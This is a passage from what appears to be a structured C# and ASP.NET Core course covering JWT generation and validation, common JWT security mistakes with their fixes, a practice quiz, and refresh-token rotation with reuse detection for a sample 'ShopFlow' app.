'iss' (issuer - who created the token). You can add custom claims like roles, permissions, or department. On your boarding pass, this is your name, flight details, and seat number.\n\n**The Signature (Security hologram and barcode)**\nThe signature ensures the token has not been tampered with. The server signs the header and payload using a secret key. Anyone can read the token (it is just Base64 encoded), but only the server can create a valid signature. This is like the hologram and encrypted barcode on your boarding pass - easy to verify, impossible to forge without access to the airline's systems.\n\nWhen you present your boarding pass at the gate, they scan it to verify: Is this a valid boarding pass format? Has it been tampered with? Is this flight still boarding? Is this the right passenger? JWT validation works identically: verify the signature, check expiration, confirm the issuer, and extract user claims."
            },
            {
              "type": "EXAMPLE",
              "title": "Generating JWTs in ShopFlow",
              "content": "This example shows a complete JWT generation service for ShopFlow, including configuration, token creation, and the login endpoint that issues tokens.",
              "code": "// ===== JWT SETTINGS =====\n// ShopFlow.Application/Common/Settings/JwtSettings.cs\n\nnamespace ShopFlow.Application.Common.Settings;\n\npublic class JwtSettings\n{\n    public const string SectionName = \"Jwt\";\n    \n    /// <summary>\n    /// Secret key for signing tokens. Must be at least 256 bits (32 characters).\n    /// Store in environment variables or secret manager in production!\n    /// </summary>\n    public string SecretKey { get; set; } = string.Empty;\n    \n    /// <summary>\n    /// Token issuer - typically your application URL or name.\n    /// </summary>\n    public string Issuer { get; set; } = string.Empty;\n    \n    /// <summary>\n    /// Token audience - who the token is intended for.\n    /// </summary>\n    public string Audience { get; set; } = string.Empty;\n    \n    /// <summary>\n    /// Access token lifetime in minutes. Keep short (15-60 minutes).\n    /// </summary>\n    public int AccessTokenExpirationMinutes { get; set; } = 15;\n    \n    /// <summary>\n    /// Refresh token lifetime in days.\n    /// </summary>\n    public int RefreshTokenExpirationDays { get; set; } = 7;\n}\n\n// ===== JWT SERVICE INTERFACE =====\n// ShopFlow.Application/Common/Interfaces/IJwtService.cs\n\nusing System.Security.Claims;\nusing ShopFlow.Domain.Entities;\n\nnamespace ShopFlow.Application.Common.Interfaces;\n\npublic interface IJwtService\n{\n    string GenerateAccessToken(ApplicationUser user, IEnumerable<string> roles);\n    string GenerateRefreshToken();\n    ClaimsPrincipal? ValidateToken(string token);\n}\n\n// ===== JWT SERVICE IMPLEMENTATION =====\n// ShopFlow.Infrastructure/Services/JwtService.cs\n\nusing System.IdentityModel.Tokens.Jwt;\nusing System.Security.Claims;\nusing System.Security.Cryptography;\nusing System.Text;\nusing Microsoft.Extensions.Options;\nusing Microsoft.IdentityModel.Tokens;\nusing ShopFlow.Application.Common.Interfaces;\nusing ShopFlow.Application.Common.Settings;\nusing ShopFlow.Domain.Entities;\n\nnamespace ShopFlow.Infrastructure.Services;\n\npublic class JwtService : IJwtService\n{\n    private readonly JwtSettings _settings;\n    private readonly SymmetricSecurityKey _signingKey;\n    \n    public JwtService(IOptions<JwtSettings> settings)\n    {\n        _settings = settings.Value;\n        \n        // Validate key length (256 bits minimum for HS256)\n        if (_settings.SecretKey.Length < 32)\n        {\n            throw new InvalidOperationException(\n                \"JWT secret key must be at least 32 characters (256 bits)\");\n        }\n        \n        _signingKey = new SymmetricSecurityKey(\n            Encoding.UTF8.GetBytes(_settings.SecretKey));\n    }\n    \n    public string GenerateAccessToken(ApplicationUser user, IEnumerable<string> roles)\n    {\n        var claims = new List<Claim>\n        {\n            // Standard claims\n            new(JwtRegisteredClaimNames.Sub, user.Id),\n            new(JwtRegisteredClaimNames.Email, user.Email ?? string.Empty),\n            new(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()),\n            new(JwtRegisteredClaimNames.Iat, \n                DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString(),\n                ClaimValueTypes.Integer64),\n            \n            // Custom claims\n            new(\"name\", user.FullName),\n            new(\"email_verified\", user.EmailConfirmed.ToString().ToLower()),\n        };\n        \n        // Add role claims\n        foreach (var role in roles)\n        {\n            claims.Add(new Claim(ClaimTypes.Role, role));\n        }\n        \n        var credentials = new SigningCredentials(\n            _signingKey,\n            SecurityAlgorithms.HmacSha256);\n        \n        var token = new JwtSecurityToken(\n            issuer: _settings.Issuer,\n            audience: _settings.Audience,\n            claims: claims,\n            notBefore: DateTime.UtcNow,\n            expires: DateTime.UtcNow.AddMinutes(_settings.AccessTokenExpirationMinutes),\n            signingCredentials: credentials);\n        \n        return new JwtSecurityTokenHandler().WriteToken(token);\n    }\n    \n    public string GenerateRefreshToken()\n    {\n        // Generate cryptographically random token\n        var randomBytes = new byte[64];\n        using var rng = RandomNumberGenerator.Create();\n        rng.GetBytes(randomBytes);\n        return Convert.ToBase64String(randomBytes);\n    }\n    \n    public ClaimsPrincipal? ValidateToken(string token)\n    {\n        var tokenHandler = new JwtSecurityTokenHandler();\n        \n        try\n        {\n            var principal = tokenHandler.ValidateToken(token, new TokenValidationParameters\n            {\n                ValidateIssuer = true,\n                ValidateAudience = true,\n                ValidateLifetime = true,\n                ValidateIssuerSigningKey = true,\n                ValidIssuer = _settings.Issuer,\n                ValidAudience = _settings.Audience,\n                IssuerSigningKey = _signingKey,\n                ClockSkew = TimeSpan.Zero // No tolerance for expired tokens\n            }, out _);\n            \n            return principal;\n        }\n        catch (SecurityTokenException)\n        {\n            return null;\n        }\n    }\n}\n\n// ===== TOKEN ENDPOINT =====\n// ShopFlow.Api/Endpoints/TokenEndpoints.cs\n\nusing Microsoft.AspNetCore.Identity;\nusing ShopFlow.Application.Common.Interfaces;\nusing ShopFlow.Domain.Entities;\n\nnamespace ShopFlow.Api.Endpoints;\n\npublic static class TokenEndpoints\n{\n    public static void MapTokenEndpoints(this IEndpointRouteBuilder routes)\n    {\n        var group = routes.MapGroup(\"/api/token\").WithTags(\"Token\");\n        \n        group.MapPost(\"/\", GenerateToken)\n            .WithName(\"GenerateToken\")\n            .WithSummary(\"Authenticate and receive JWT tokens\")\n            .Produces<TokenResponse>(StatusCodes.Status200OK)\n            .Produces(StatusCodes.Status401Unauthorized)\n            .AllowAnonymous();\n    }\n    \n    private static async Task<IResult> GenerateToken(\n        TokenRequest request,\n        UserManager<ApplicationUser> userManager,\n        SignInManager<ApplicationUser> signInManager,\n        IJwtService jwtService,\n        ILogger<Program> logger)\n    {\n        // Find user\n        var user = await userManager.FindByEmailAsync(request.Email);\n        \n        if (user is null)\n        {\n            logger.LogWarning(\"Token request for unknown email: {Email}\", request.Email);\n            return Results.Unauthorized();\n        }\n        \n        // Verify password (without creating a cookie session)\n        var passwordValid = await userManager.CheckPasswordAsync(user, request.Password);\n        \n        if (!passwordValid)\n        {\n            // Increment failed access count for lockout\n            await userManager.AccessFailedAsync(user);\n            \n            logger.LogWarning(\"Invalid password for user: {UserId}\", user.Id);\n            return Results.Unauthorized();\n        }\n        \n        // Check if locked out\n        if (await userManager.IsLockedOutAsync(user))\n        {\n            logger.LogWarning(\"Token request for locked account: {UserId}\", user.Id);\n            return Results.Problem(\n                statusCode: StatusCodes.Status423Locked,\n                title: \"Account Locked\",\n                detail: \"Too many failed attempts. Try again later.\");\n        }\n        \n        // Check email confirmed\n        if (!await userManager.IsEmailConfirmedAsync(user))\n        {\n            return Results.Problem(\n                statusCode: StatusCodes.Status403Forbidden,\n                title: \"Email Not Confirmed\",\n                detail: \"Please confirm your email before requesting tokens.\");\n        }\n        \n        // Reset access failed count on successful authentication\n        await userManager.ResetAccessFailedCountAsync(user);\n        \n        // Get roles\n        var roles = await userManager.GetRolesAsync(user);\n        \n        // Generate tokens\n        var accessToken = jwtService.GenerateAccessToken(user, roles);\n        var refreshToken = jwtService.GenerateRefreshToken();\n        \n        // TODO: Store refresh token in database (covered in next lesson)\n        \n        logger.LogInformation(\"Tokens generated for user: {UserId}\", user.Id);\n        \n        return Results.Ok(new TokenResponse(\n            AccessToken: accessToken,\n            RefreshToken: refreshToken,\n            ExpiresIn: 900, // 15 minutes in seconds\n            TokenType: \"Bearer\"\n        ));\n    }\n}\n\npublic record TokenRequest(string Email, string Password);\n\npublic record TokenResponse(\n    string AccessToken,\n    string RefreshToken,\n    int ExpiresIn,\n    string TokenType\n);",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Configuring JWT Authentication",
              "content": "## Setting Up JWT Authentication in ASP.NET Core\n\nConfiguring JWT authentication requires careful attention to both the service registration and the validation parameters. Let us walk through a production-ready setup.\n\n### Configuration in appsettings.json\n\n```json\n{\n  \"Jwt\": {\n    \"SecretKey\": \"ThisKeyIsStoredInUserSecretsOrKeyVault_NotHere!\",\n    \"Issuer\": \"https://shopflow.com\",\n    \"Audience\": \"https://shopflow.com\",\n    \"AccessTokenExpirationMinutes\": 15,\n    \"RefreshTokenExpirationDays\": 7\n  }\n}\n```\n\n**Important:** Never store the actual secret key in appsettings.json! Use User Secrets for development and Azure Key Vault or environment variables for production.\n\n### Program.cs Configuration\n\n```csharp\nusing Microsoft.AspNetCore.Authentication.JwtBearer;\nusing Microsoft.IdentityModel.Tokens;\nusing System.Text;\n\n// Bind settings\nbuilder.Services.Configure<JwtSettings>(\n    builder.Configuration.GetSection(JwtSettings.SectionName));\n\n// Register JWT service\nbuilder.Services.AddSingleton<IJwtService, JwtService>();\n\n// Configure authentication\nbuilder.Services.AddAuthentication(options =>\n{\n    options.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme;\n    options.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme;\n    options.DefaultScheme = JwtBearerDefaults.AuthenticationScheme;\n})\n.AddJwtBearer(options =>\n{\n    var jwtSettings = builder.Configuration\n        .GetSection(JwtSettings.SectionName)\n        .Get<JwtSettings>()!;\n    \n    options.TokenValidationParameters = new TokenValidationParameters\n    {\n        // Validate the issuer (who created the token)\n        ValidateIssuer = true,\n        ValidIssuer = jwtSettings.Issuer,\n        \n        // Validate the audience (who the token is for)\n        ValidateAudience = true,\n        ValidAudience = jwtSettings.Audience,\n        \n        // Validate the token hasn't expired\n        ValidateLifetime = true,\n        \n        // Validate the signing key\n        ValidateIssuerSigningKey = true,\n        IssuerSigningKey = new SymmetricSecurityKey(\n            Encoding.UTF8.GetBytes(jwtSettings.SecretKey)),\n        \n        // No tolerance for expired tokens (default is 5 minutes!)\n        ClockSkew = TimeSpan.Zero,\n        \n        // Ensure the token has an expiration claim\n        RequireExpirationTime = true,\n        \n        // Map standard claim names\n        NameClaimType = \"name\",\n        RoleClaimType = ClaimTypes.Role\n    };\n    \n    // Handle authentication events\n    options.Events = new JwtBearerEvents\n    {\n        OnAuthenticationFailed = context =>\n        {\n            var logger = context.HttpContext.RequestServices\n                .GetRequiredService<ILogger<Program>>();\n            \n            logger.LogWarning(\n                \"Authentication failed: {Exception}\",\n                context.Exception.Message);\n            \n            return Task.CompletedTask;\n        },\n        \n        OnTokenValidated = context =>\n        {\n            var logger = context.HttpContext.RequestServices\n                .GetRequiredService<ILogger<Program>>();\n            \n            var userId = context.Principal?.FindFirst(\"sub\")?.Value;\n            logger.LogDebug(\"Token validated for user: {UserId}\", userId);\n            \n            return Task.CompletedTask;\n        },\n        \n        OnChallenge = context =>\n        {\n            // Customize the 401 response\n            context.HandleResponse();\n            context.Response.StatusCode = 401;\n            context.Response.ContentType = \"application/json\";\n            \n            var result = JsonSerializer.Serialize(new\n            {\n                error = \"Unauthorized\",\n                message = \"Valid JWT token required\"\n            });\n            \n            return context.Response.WriteAsync(result);\n        }\n    };\n});\n```\n\n### TokenValidationParameters Explained\n\n| Parameter | Purpose | Recommendation |\n|-----------|---------|----------------|\n| ValidateIssuer | Check the 'iss' claim matches expected issuer | Always true |\n| ValidateAudience | Check the 'aud' claim matches expected audience | Always true |\n| ValidateLifetime | Check the token hasn't expired | Always true |\n| ValidateIssuerSigningKey | Verify the signature is valid | Always true |\n| ClockSkew | Tolerance for expiration time differences | Set to Zero |\n| RequireExpirationTime | Reject tokens without 'exp' claim | True |\n| NameClaimType | Which claim to use for User.Identity.Name | Custom claim name |\n| RoleClaimType | Which claim to use for role-based auth | ClaimTypes.Role |\n\n### Protecting Endpoints\n\nOnce JWT authentication is configured, protect your endpoints:\n\n```csharp\n// Require authentication for all routes in a group\nvar api = app.MapGroup(\"/api\")\n    .RequireAuthorization();\n\n// Or per-endpoint\napp.MapGet(\"/api/profile\", GetProfile)\n    .RequireAuthorization();\n\n// With specific policy\napp.MapDelete(\"/api/products/{id}\", DeleteProduct)\n    .RequireAuthorization(\"AdminOnly\");\n\n// Allow anonymous access\napp.MapPost(\"/api/token\", GenerateToken)\n    .AllowAnonymous();\n```\n\nThe JWT is passed in the Authorization header: `Authorization: Bearer eyJhbGciOiJIUzI1NiIs...`"
            },
            {
              "type": "WARNING",
              "title": "JWT Security Pitfalls",
              "content": "## Common JWT Security Mistakes\n\n### Weak or Exposed Secret Keys\n\n**The Mistake:** Using short, simple, or hardcoded secret keys in source code.\n\n**Examples of Bad Keys:**\n```csharp\n// DON'T DO THESE!\nvar key = \"secret\";              // Too short, too simple\nvar key = \"my-jwt-secret-key\";   // Predictable pattern\nvar key = \"shopflow123\";         // Contains app name, simple\n```\n\n**The Risk:** Short keys can be brute-forced. Predictable keys can be guessed. Hardcoded keys get committed to source control and exposed in code reviews, logs, or breaches.\n\n**The Fix:**\n```csharp\n// Generate a strong key (run once, store securely)\nvar randomBytes = new byte[64];\nusing var rng = RandomNumberGenerator.Create();\nrng.GetBytes(randomBytes);\nvar strongKey = Convert.ToBase64String(randomBytes);\n// Store in User Secrets (development) or Key Vault (production)\n```\n\nMinimum key length: 256 bits (32 bytes) for HS256. Use 512 bits (64 bytes) for extra security.\n\n### Storing Sensitive Data in Token Payload\n\n**The Mistake:** Including passwords, SSN, credit cards, or internal system details in JWT claims.\n\n**The Risk:** JWT payloads are Base64 encoded, NOT encrypted. Anyone can decode and read them:\n```bash\necho 'eyJzdWIiOiIxMjM0NTY3ODkwIiwiY3JlZGl0X2NhcmQiOiI0MTExLTExMTEtMTExMS0xMTExIn0' | base64 -d\n# Output: {\"sub\":\"1234567890\",\"credit_card\":\"4111-1111-1111-1111\"}\n```\n\n**The Fix:** Only include non-sensitive, necessary claims:\n```csharp\n// SAFE claims\nnew Claim(\"sub\", user.Id),\nnew Claim(\"name\", user.DisplayName),\nnew Claim(\"role\", \"Customer\"),\nnew Claim(\"email_verified\", \"true\")\n\n// NEVER include\n// - Passwords or hashes\n// - Financial data\n// - Social security numbers\n// - Medical information\n// - Internal IDs that expose system architecture\n```\n\n### Long Token Expiration Times\n\n**The Mistake:** Setting access tokens to expire in days or weeks for 'user convenience'.\n\n**The Risk:** If a token is stolen, the attacker has a long window to use it. Unlike cookies, JWTs cannot be invalidated without additional infrastructure.\n\n**The Fix:** Keep access tokens short-lived:\n```csharp\n// Access tokens: 15-60 minutes\nexpires: DateTime.UtcNow.AddMinutes(15)\n\n// Use refresh tokens for longer sessions\n// Refresh tokens: 7-30 days, stored securely, rotated on use\n```\n\n### Disabling Signature Validation\n\n**The Mistake:** Setting `ValidateIssuerSigningKey = false` to 'simplify development'.\n\n**The Risk:** Anyone can create a valid-looking token with any claims they want. Complete bypass of authentication.\n\n**The Fix:** Never disable validation in any environment:\n```csharp\noptions.TokenValidationParameters = new TokenValidationParameters\n{\n    ValidateIssuer = true,\n    ValidateAudience = true,\n    ValidateLifetime = true,\n    ValidateIssuerSigningKey = true,  // ALWAYS TRUE!\n    // ...\n};\n```\n\n### Trusting the 'alg' Header Without Validation\n\n**The Mistake:** Older JWT libraries allowed the token to specify its own signing algorithm, including 'none' for no signature.\n\n**The Risk:** Attacker changes alg to 'none', removes the signature, and the token is accepted as valid.\n\n**The Fix:** Modern libraries like Microsoft.IdentityModel.Tokens handle this correctly by default, but always specify your expected algorithm:\n```csharp\nvar credentials = new SigningCredentials(\n    _signingKey,\n    SecurityAlgorithms.HmacSha256);  // Explicitly use HS256\n```\n\n### Not Validating ClockSkew\n\n**The Mistake:** Leaving the default ClockSkew of 5 minutes.\n\n**The Risk:** Tokens continue to work for 5 minutes after they technically expire. In a 15-minute token, that is 33% extra lifetime for stolen tokens.\n\n**The Fix:**\n```csharp\noptions.TokenValidationParameters = new TokenValidationParameters\n{\n    // ...\n    ClockSkew = TimeSpan.Zero  // No tolerance\n};\n```\n\nIf you have distributed systems with clock drift, fix the clocks (use NTP) rather than loosening security.\n\n### Storing Tokens in localStorage\n\n**The Mistake:** Storing JWTs in browser localStorage because it is convenient.\n\n**The Risk:** Any JavaScript on the page can read localStorage, including XSS-injected scripts. One XSS vulnerability exposes all your tokens.\n\n**The Fix:** Store tokens in HttpOnly cookies (for web apps) or secure device storage (for mobile apps). For SPAs, consider the Backend-For-Frontend (BFF) pattern where the server holds the tokens."
            }
          ],
          "challenges": [
            {
              "type": "QUIZ",
              "id": "lesson-20-04-challenge-01",
              "title": "JWT Security Understanding",
              "description": "Test your understanding of JWT token security.",
              "instructions": "Answer the following question about JWT expiration times.",
              "question": "Why should JWT access tokens have short expiration times (15-60 minutes) instead of long expiration times (days or weeks)?",
              "options": [
                "Short tokens are smaller in size and faster to transmit",
                "JWTs cannot be easily invalidated once issued, so short expiration limits the damage window if a token is stolen",
                "Short tokens use less memory on the server",
                "The JWT specification requires tokens to expire within one hour"
              ],
              "correctAnswer": 1,
              "explanation": "JWTs are stateless tokens that are validated using cryptographic signatures, not by checking a database. This means once a JWT is issued, it remains valid until it expires - you cannot easily 'revoke' it without implementing additional infrastructure like a token blacklist or changing the signing key (which invalidates ALL tokens).\n\nIf an attacker steals a JWT with a 7-day expiration, they have 7 days to use it. If the token expires in 15 minutes, the attack window is dramatically reduced.\n\nTo provide good user experience with short access tokens, we use refresh tokens: short-lived access tokens (15-60 minutes) paired with longer-lived refresh tokens (days). Refresh tokens can be revoked since they require a database lookup to exchange for new access tokens.\n\nThe other options are incorrect:\n- Token size is determined by the number of claims, not expiration time\n- JWTs are stateless; the server does not store them in memory\n- There is no specification requirement for one-hour expiration",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-20-05",
          "title": "Refresh Tokens and Token Lifecycle",
          "moduleId": "module-20",
          "order": 5,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Access Token + Refresh Token Pattern",
              "content": "Imagine checking into a hotel for a week-long stay. At the front desk, the receptionist verifies your ID and credit card (authentication), then gives you two things: a room key card and a registration receipt.\n\nThe room key card (Access Token) grants you immediate access to your room and hotel facilities. However, the hotel programs it to expire at midnight each day. This short expiration means if someone steals your key card, they can only use it until midnight - limiting the damage.\n\nThe registration receipt (Refresh Token) proves you are a registered guest. Each morning, you take the receipt to the front desk and they issue you a new key card for that day. The receipt itself has a longer validity - the duration of your stay. If you lose your receipt, you must re-verify your identity with the original ID and credit card.\n\nThis two-token system provides the best of both worlds:\n\n**Short-lived access token benefits:**\n- If stolen, limited time for misuse\n- Does not require database lookup on every request (stateless validation)\n- Contains claims needed for authorization decisions\n\n**Long-lived refresh token benefits:**\n- User does not need to re-enter password constantly\n- Can be revoked immediately (requires database lookup only when refreshing)\n- Can detect suspicious activity (same refresh token used from different locations)\n\nThe hotel analogy extends further. When you get a new key card each morning, the hotel also gives you a new registration receipt. This is called token rotation - even the refresh token changes on each use. Why? If someone photographs your receipt, they can only use it once. The moment you use the real receipt, their copy becomes invalid.\n\nIf the hotel detects the same receipt being used twice (you refreshing your key, then the attacker trying), they know something is wrong and can revoke all your tokens, forcing you to re-authenticate. This is refresh token reuse detection - a critical security feature."
            },
            {
              "type": "EXAMPLE",
              "title": "Implementing Refresh Tokens",
              "content": "This example shows a complete refresh token implementation with secure storage, rotation, and reuse detection.",
              "code": "// ===== REFRESH TOKEN ENTITY =====\n// ShopFlow.Domain/Entities/RefreshToken.cs\n\nnamespace ShopFlow.Domain.Entities;\n\npublic class RefreshToken\n{\n    public int Id { get; set; }\n    \n    /// <summary>\n    /// The actual token value (hashed for storage).\n    /// </summary>\n    public string TokenHash { get; set; } = string.Empty;\n    \n    /// <summary>\n    /// User who owns this token.\n    /// </summary>\n    public string UserId { get; set; } = string.Empty;\n    public ApplicationUser User { get; set; } = null!;\n    \n    /// <summary>\n    /// When the token was created.\n    /// </summary>\n    public DateTime CreatedAt { get; set; } = DateTime.UtcNow;\n    \n    /// <summary>\n    /// When the token expires.\n    /// </summary>\n    public DateTime ExpiresAt { get; set; }\n    \n    /// <summary>\n    /// When the token was revoked (null if still active).\n    /// </summary>\n    public DateTime? RevokedAt { get; set; }\n    \n    /// <summary>\n    /// IP address that created this token.\n    /// </summary>\n    public string? CreatedByIp { get; set; }\n    \n    /// <summary>\n    /// The token that replaced this one (for rotation tracking).\n    /// </summary>\n    public string? ReplacedByTokenHash { get; set; }\n    \n    /// <summary>\n    /// Reason for revocation if revoked.\n    /// </summary>\n    public string? RevokedReason { get; set; }\n    \n    /// <summary>\n    /// Token family ID for detecting reuse attacks.\n    /// All rotated tokens share the same family.\n    /// </summary>\n    public string FamilyId { get; set; } = Guid.NewGuid().ToString();\n    \n    public bool IsActive => RevokedAt is null && DateTime.UtcNow < ExpiresAt;\n    public bool IsExpired => DateTime.UtcNow >= ExpiresAt;\n    public bool IsRevoked => RevokedAt is not null;\n}\n\n// ===== REFRESH TOKEN SERVICE =====\n// ShopFlow.Infrastructure/Services/RefreshTokenService.cs\n\nusing System.Security.Cryptography;\nusing Microsoft.EntityFrameworkCore;\nusing Microsoft.Extensions.Options;\nusing ShopFlow.Application.Common.Interfaces;\nusing ShopFlow.Application.Common.Settings;\nusing ShopFlow.Domain.Entities;\nusing ShopFlow.Infrastructure.Data;\n\nnamespace ShopFlow.Infrastructure.Services;\n\npublic class RefreshTokenService : IRefreshTokenService\n{\n    private readonly ShopFlowDbContext _context;\n    private readonly JwtSettings _settings;\n    private readonly ILogger<RefreshTokenService> _logger;\n    \n    public RefreshTokenService(\n        ShopFlowDbContext context,\n        IOptions<JwtSettings> settings,\n        ILogger<RefreshTokenService> logger)\n    {\n        _context = context;\n        _settings = settings.Value;\n        _logger = logger;\n    }\n    \n    /// <summary>\n    /// Creates a new refresh token for the user.\n    /// </summary>\n    public async Task<(string Token, RefreshToken Entity)> CreateRefreshTokenAsync(\n        string userId,\n        string? ipAddress = null,\n        string? existingFamilyId = null)\n    {\n        // Generate cryptographically random token\n        var tokenBytes = new byte[64];\n        using var rng = RandomNumberGenerator.Create();\n        rng.GetBytes(tokenBytes);\n        var token = Convert.ToBase64String(tokenBytes);\n        \n        // Hash the token for storage (don't store plaintext!)\n        var tokenHash = HashToken(token);\n        \n        var refreshToken = new RefreshToken\n        {\n            TokenHash = tokenHash,\n            UserId = userId,\n            CreatedAt = DateTime.UtcNow,\n            ExpiresAt = DateTime.UtcNow.AddDays(_settings.RefreshTokenExpirationDays),\n            CreatedByIp = ipAddress,\n            FamilyId = existingFamilyId ?? Guid.NewGuid().ToString()\n        };\n        \n        _context.RefreshTokens.Add(refreshToken);\n        await _context.SaveChangesAsync();\n        \n        _logger.LogInformation(\n            \"Created refresh token for user {UserId}, family {FamilyId}\",\n            userId,\n            refreshToken.FamilyId);\n        \n        // Return plaintext token to send to client, and entity for reference\n        return (token, refreshToken);\n    }\n    \n    /// <summary>\n    /// Rotates a refresh token - validates old token, creates new one, invalidates old.\n    /// </summary>\n    public async Task<RefreshResult> RotateRefreshTokenAsync(\n        string token,\n        string? ipAddress = null)\n    {\n        var tokenHash = HashToken(token);\n        \n        var existingToken = await _context.RefreshTokens\n            .Include(t => t.User)\n            .FirstOrDefaultAsync(t => t.TokenHash == tokenHash);\n        \n        if (existingToken is null)\n        {\n            _logger.LogWarning(\"Refresh token not found\");\n            return RefreshResult.Failed(\"Invalid refresh token\");\n        }\n        \n        // Check if token was already used (reuse attack detection!)\n        if (existingToken.IsRevoked)\n        {\n            _logger.LogWarning(\n                \"Reuse detected for token family {FamilyId}, user {UserId}. Revoking all family tokens.\",\n                existingToken.FamilyId,\n                existingToken.UserId);\n            \n            // Revoke ALL tokens in this family - potential attack!\n            await RevokeTokenFamilyAsync(\n                existingToken.FamilyId,\n                \"Reuse detected - potential token theft\");\n            \n            return RefreshResult.Failed(\n                \"Token reuse detected. All sessions have been terminated for security.\");\n        }\n        \n        if (existingToken.IsExpired)\n        {\n            _logger.LogWarning(\n                \"Expired refresh token used for user {UserId}\",\n                existingToken.UserId);\n            \n            return RefreshResult.Failed(\"Refresh token has expired. Please log in again.\");\n        }\n        \n        // Check if user is still active\n        if (!existingToken.User.IsActive)\n        {\n            await RevokeTokenFamilyAsync(existingToken.FamilyId, \"User deactivated\");\n            return RefreshResult.Failed(\"Account has been deactivated.\");\n        }\n        \n        // Create new token (same family for tracking)\n        var (newToken, newEntity) = await CreateRefreshTokenAsync(\n            existingToken.UserId,\n            ipAddress,\n            existingToken.FamilyId);\n        \n        // Revoke old token (mark as replaced)\n        existingToken.RevokedAt = DateTime.UtcNow;\n        existingToken.ReplacedByTokenHash = newEntity.TokenHash;\n        existingToken.RevokedReason = \"Rotated\";\n        \n        await _context.SaveChangesAsync();\n        \n        _logger.LogInformation(\n            \"Rotated refresh token for user {UserId}, family {FamilyId}\",\n            existingToken.UserId,\n            existingToken.FamilyId);\n        \n        return RefreshResult.Success(newToken, existingToken.User);\n    }\n    \n    /// <summary>\n    /// Revokes all tokens in a family (used for logout or security events).\n    /// </summary>\n    public async Task RevokeTokenFamilyAsync(string familyId, string reason)\n    {\n        var tokens = await _context.RefreshTokens\n            .Where(t => t.FamilyId == familyId && t.RevokedAt == null)\n            .ToListAsync();\n        \n        foreach (var token in tokens)\n        {\n            token.RevokedAt = DateTime.UtcNow;\n            token.RevokedReason = reason;\n        }\n        \n        await _context.SaveChangesAsync();\n        \n        _logger.LogInformation(\n            \"Revoked {Count} tokens in family {FamilyId}: {Reason}\",\n            tokens.Count,\n            familyId,\n            reason);\n    }\n    \n    /// <summary>\n    /// Revokes all tokens for a user (used for password change, security events).\n    /// </summary>\n    public async Task RevokeAllUserTokensAsync(string userId, string reason)\n    {\n        var tokens = await _context.RefreshTokens\n            .Where(t => t.UserId == userId && t.RevokedAt == null)\n            .ToListAsync();\n        \n        foreach (var token in tokens)\n        {\n            token.RevokedAt = DateTime.UtcNow;\n            token.RevokedReason = reason;\n        }\n        \n        await _context.SaveChangesAsync();\n        \n        _logger.LogInformation(\n            \"Revoked all {Count} tokens for user {UserId}: {Reason}\",\n            tokens.Count,\n            userId,\n            reason);\n    }\n    \n    /// <summary>\n    /// Cleans up expired tokens (run periodically).\n    /// </summary>\n    public async Task CleanupExpiredTokensAsync(int daysToKeep = 30)\n    {\n        var cutoff = DateTime.UtcNow.AddDays(-daysToKeep);\n        \n        var expiredTokens = await _context.RefreshTokens\n            .Where(t => t.ExpiresAt < cutoff)\n            .ToListAsync();\n        \n        _context.RefreshTokens.RemoveRange(expiredTokens);\n        await _context.SaveChangesAsync();\n        \n        _logger.LogInformation(\n            \"Cleaned up {Count} expired refresh tokens\",\n            expiredTokens.Count);\n    }\n    \n    private static string HashToken(string token)\n    {\n        using var sha256 = SHA256.Create();\n        var bytes = System.Text.Encoding.UTF8.GetBytes(token);\n        var hash = sha256.ComputeHash(bytes);\n        return Convert.ToBase64String(hash);\n    }\n}\n\npublic record RefreshResult(\n    bool Succeeded,\n    string? NewToken,\n    ApplicationUser? User,\n    string? ErrorMessage)\n{\n    public static RefreshResult Success(string token, ApplicationUser user) =>\n        new(true, token, user, null);\n    \n    public static RefreshResult Failed(string error) =>\n        new(false, null, null, error);\n}",
              "language": "csharp"
            },
            {
              "type": "DEEP_DIVE",
              "title": "Token Rotation and Security",
              "content": "## Why Rotate Refresh Tokens?\n\nToken rotation means issuing a new refresh token every time the old one is used, immediately invalidating the old token. This seemingly simple practice provides powerful security benefits.\n\n### The Attack Scenario Without Rotation\n\nImagine an attacker intercepts a user's refresh token through a man-in-the-middle attack, malware, or a compromised network. With a non-rotating token that is valid for 30 days:\n\n1. **Day 1:** Attacker obtains the refresh token\n2. **Days 1-30:** Attacker can silently access the user's account\n3. The user notices nothing wrong - their token still works too\n4. You have no way to detect this unless the user manually notices unauthorized activity\n\n### The Same Scenario With Rotation\n\n1. **Day 1:** Attacker obtains the refresh token\n2. **Day 2:** User refreshes their token - gets Token B, Token A is invalidated\n3. **Day 3:** Attacker tries to use Token A - DETECTED!\n4. System revokes all tokens in the family\n5. Both user and attacker are logged out\n6. User re-authenticates; attacker cannot\n\nThe key insight: **token reuse becomes detectable**. A refresh token should only ever be used once. If it is used twice, someone has a copy they should not have.\n\n### Token Families for Reuse Detection\n\nA token family is a chain of rotated tokens that all trace back to an original authentication. When a user logs in, they start a new family. Each rotation creates a new token in the same family.\n\n```\nLogin -> Token A (Family: abc-123)\n         |\n         v Rotation\n       Token B (Family: abc-123, replaced A)\n         |\n         v Rotation  \n       Token C (Family: abc-123, replaced B)\n```\n\nWhen reuse is detected (Token B used after Token C was issued), we revoke the ENTIRE family. This terminates both the legitimate session and the attacker's session. Yes, the user is inconvenienced, but the attacker is stopped, and the user is alerted to the security incident.\n\n### Implementation Considerations\n\n**Race Conditions:** What if a user has multiple browser tabs that simultaneously try to refresh? One will succeed, and the others will fail with 'reuse detected'. Solution: implement a short grace period (10-30 seconds) where the previous token remains valid, or handle the error client-side by retrying with the new token.\n\n**Offline Clients:** Mobile apps that go offline may have stale refresh tokens. When they come back online and their token has been rotated, they will be logged out. This is correct security behavior - if you cannot verify the chain of custody, require re-authentication.\n\n**Token Storage:** Refresh tokens must be stored securely. Unlike access tokens (which can be validated cryptographically), refresh tokens require a database lookup. This lookup should use a hashed version of the token, never the plaintext.\n\n### Cleanup and Maintenance\n\nRefresh tokens accumulate in the database as users log in and out. Implement periodic cleanup:\n\n```csharp\n// Run daily via background service\npublic async Task CleanupExpiredTokensAsync()\n{\n    var cutoff = DateTime.UtcNow.AddDays(-30);\n    \n    // Delete tokens that expired more than 30 days ago\n    await 